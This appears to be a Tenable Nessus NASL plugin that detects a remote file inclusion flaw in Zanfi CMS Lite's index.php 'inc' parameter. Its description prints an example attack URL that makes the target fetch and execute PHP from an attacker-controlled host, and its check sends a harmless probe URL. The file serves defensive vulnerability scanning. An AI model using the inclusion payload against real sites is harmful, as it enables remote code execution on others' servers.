#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#


include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(15452);
  script_version("1.21");
  script_cve_id("CVE-2004-2195");
  script_bugtraq_id(11362);

  script_name(english:"Zanfi CMS Lite index.php inc Parameter Remote File Inclusion");
  script_summary(english:"Determines if Zanfi CMS can include third-party files");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to arbitrary
PHP code execution and file disclosure attacks." );
  script_set_attribute(attribute:"description", value:
"The remote host is running Zanfi CMS Lite, a content management system
written in PHP. 

There is a bug in the remote version of this software that may allow
an attacker to execute arbitrary commands on the remote host by using
a file inclusion bug in the file 'index.php'. 

An attacker may execute arbitrary commands by requesting :

  http://www.example.com/index.php?inc=http://[evilsite]/commands

This will make the remote script include the file 'commands.php' and
execute it." );
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/378053" );
  script_set_attribute(attribute:"solution", value:"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2004-2195");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"plugin_publication_date", value: "2004/10/11");
  script_set_attribute(attribute:"vuln_publication_date", value: "2004/10/11");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/01/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2004-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port))exit(0);

foreach d (cgi_dirs())
{
 url = string(d, "/index.php?inc=http://example.com/foo");
 r = http_send_recv3(method: "GET", port:port, item: url);
 if (isnull(r) ) exit(0);
 if ( "getaddrinfo failed" >< r[2] )
 {
  security_hole(port);
  exit(0);
 }
}
